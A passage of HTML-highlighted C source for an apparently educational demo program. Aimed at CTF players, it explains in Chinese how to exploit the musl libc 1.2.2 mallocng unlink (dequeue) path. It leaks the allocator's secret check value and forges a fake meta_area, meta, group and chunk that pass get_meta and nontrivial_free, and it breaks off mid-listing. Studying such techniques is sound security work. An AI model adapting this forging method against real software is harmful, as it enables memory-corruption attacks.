class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_1[<span class="number">0x8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_2[<span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> group* <span class="title function_">get_group</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)(chunk - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (chunk[<span class="number">-4</span>])</span><br><span class="line">        offset = *(<span class="type">unsigned</span> <span class="type">int</span> *)(chunk - <span class="number">8</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> (<span class="type">void</span> *)(chunk - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> group_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta* <span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> get_group(chunk);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">meta_addr</span> =</span> group_addr-&gt;meta;</span><br><span class="line">    <span class="keyword">return</span> meta_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta_area* <span class="title function_">get_meta_area</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* meta)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta_area*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示musl libc中的unlink操作。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;测试环境：ubuntu 22.04，musl libc版本：1.2.2。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;鉴于musl libc的轻量性，与其相关的利用方式也较为单一。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序所演示的unlink是最为常用的一种利用方式之一。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;musl libc与glibc不同，在主程序的main函数开始执行时，内存分配器就已经完成了初始化。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;请注意：在一个group中分配出来的chunk很可能在地址空间上不相邻。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因为一个group需要确保每个chunk都能够容纳该范围内最大的chunk。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此，调试便是musl libc赛题的重中之重。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是刚刚进入main函数时堆的情况：\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;pwndbg&gt; mheap\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;          secret : 0xd8e803bc461ae35a\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    mmap_counter : 0x0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      avail_meta : 0x55555555a0e0 (count: 96)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       free_meta : 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot; avail_meta_area : 0x55555555b000 (count: 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_head : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_tail : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       active[7] : 0x55555555a090 (mem: 0x555555558f40) -&gt; 0x55555555a0b8 (mem: 0x7ffff7ffef40) [0x80]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[15] : 0x55555555a068 (mem: 0x555555558d40) [0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[19] : 0x55555555a040 (mem: 0x555555558940) [0x3f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[23] : 0x55555555a018 (mem: 0x555555558140) [0x7f0]\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可见已经有一些meta被链入到链表数组之中了。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;但这对做题的影响并不大，通过多次调试，我们就能够让自己的chunk进入想要的meta。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来让我们尝试分配几个chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++) &#123;</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x140</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc返回的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;\n接下来让我们用源码中给出的寻找chunk所在meta的方法回溯这些chunk所在的group和meta。\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">groups</span>[14];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">metas</span>[14];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        groups[i] = get_group(chunks[i]);</span><br><span class="line">        metas[i] = get_meta(chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc获得chunk的group地址和meta地址分别为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p %p\n\033[0m&quot;</span>, groups[i], metas[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过nontrivial_free中的dequeue函数进行unlink，首先要通过get_meta函数的重重检查：\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/meta.h, line 129)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static inline struct meta *get_meta(const unsigned char *p)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!((uintptr_t)p &amp; 15));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint offset = *(const uint16_t *)(p - 2);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint index = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (p[-4]) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(!offset);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\toffset = *(uint32_t *)(p - 8);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt; 0xffff);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta *meta = base-&gt;meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(meta-&gt;mem == base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(index &lt;= meta-&gt;last_idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(area-&gt;check == ctx.secret);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;sizeclass &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(meta-&gt;sizeclass == 63);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct meta *)meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面我们逐一查看一下这些检查的具体内容。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;1. meta-&gt;mem == base，即meta中保存的group指针要正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;2. index &lt;= meta-&gt;last_idx，即chunk的索引不能越界。\n&quot;</span>);</span><br><span class="line">    printf_color(RED   , HIGHLIGHT, <span class="string">&quot;3. area-&gt;check == ctx.secret，即meta所在的meta_area的校验值正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;4. offset &gt;= size_classes[meta-&gt;sizeclass]*index\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;5. offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;6. assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);，即检查offset是否越界。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这些检查之中对我们最为重要的就是校验值的检查。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只有泄露出secret值，我们才能释放伪造meta_area中伪造meta的group的chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">area</span> =</span> get_meta_area(metas[<span class="number">0</span>]);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;上面分配的所有meta均在同一个meta_area中，地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\n\033[0m&quot;</span>, area);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以由此获取到secret的值为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%#llx\n\n\033[0m&quot;</span>, area-&gt;check);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> secret = area-&gt;check;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们来伪造chunk以及其上的结构。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* mmap_space = mmap((<span class="type">void</span>*)<span class="number">0xdeadbeef000</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = <span class="number">7</span>;       <span class="comment">// group中保存的chunk大小，这里设置为0x80</span></span><br><span class="line">    fake_meta-&gt;last_idx = <span class="number">4</span>;        <span class="comment">// group中chunk的总数，这里设置为4表示chunk总数为5</span></span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;        <span class="comment">// 通过okay_to_free检查</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;    <span class="comment">// 通过检查1</span></span><br><span class="line">    fake_group-&gt;meta = fake_meta;   <span class="comment">// 使group能够找到meta</span></span><br><span class="line">    fake_meta-&gt;avail_mask = <span class="number">0b11101</span>;<span class="comment">// 使nontrivial_free进入if循环，得以执行dequeue</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fake_chunk = (<span class="type">char</span>*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span> + <span class="number">0x10</span> + <span class="number">0x80</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">short</span> *)(fake_chunk - <span class="number">2</span>) = <span class="number">8</span>;    <span class="comment">// offset</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">char</span>*)(fake_chunk - <span class="number">3</span>) = <span class="number">1</span>;      <span class="comment">// index</span></span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;绕过第1个检查，只需要设置meta中的group指针为假group指针即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第2个检查需要正确设置chunk的index值，本程序释放的是group中第2个chunk，因此索引为1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意索引值存放的位置，是chunk地址-3这个字节。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第3个检查需要我们提前泄露secret的值，并填写到meta_area中。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;检查4和5只需要正确计算chunk的大小，填写chunk的索引值即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序尝试释放sizeclass=7的chunk，即chunk大小为0x80，因此第2个chunk的索引为0x80&gt;&gt;4=8。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;索引值index保存在chunk的前面两个字节中，正确填入即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;正确设置index后，检查6一般也是没有问题的。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在通过get_meta的检查后，还需要通过nontrivial_free中的if语句条件判断。\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 72)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo nontrivial_free(struct meta *g, int i)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t self = 1u&lt;&lt;i;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))\033[1;&quot;</span> PURPLE <span class="string">&quot;m &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// any multi-slot group is necessarily on an active list\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// here, but single-slot groups might or might not be.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (g-&gt;next) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tint activate_new = (ctx.active[sc]==g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tdequeue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\tactivate_group(ctx.active[sc]);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\treturn free_group(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else if (!mask) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// might still be active if there were no allocations\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// after last available slot was taken.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (ctx.active[sc] != g) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tqueue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\ta_or(&amp;g-&gt;freed_mask, self);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct mapinfo)&#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只需要修改meta中的freeable字段为1即可通过该检查。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后还需要在free_group中进入正确的else分支：\n\n&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 14)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo free_group(struct meta *g)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct mapinfo mi = &#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (sc &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tctx.usage_by_class[sc] -= 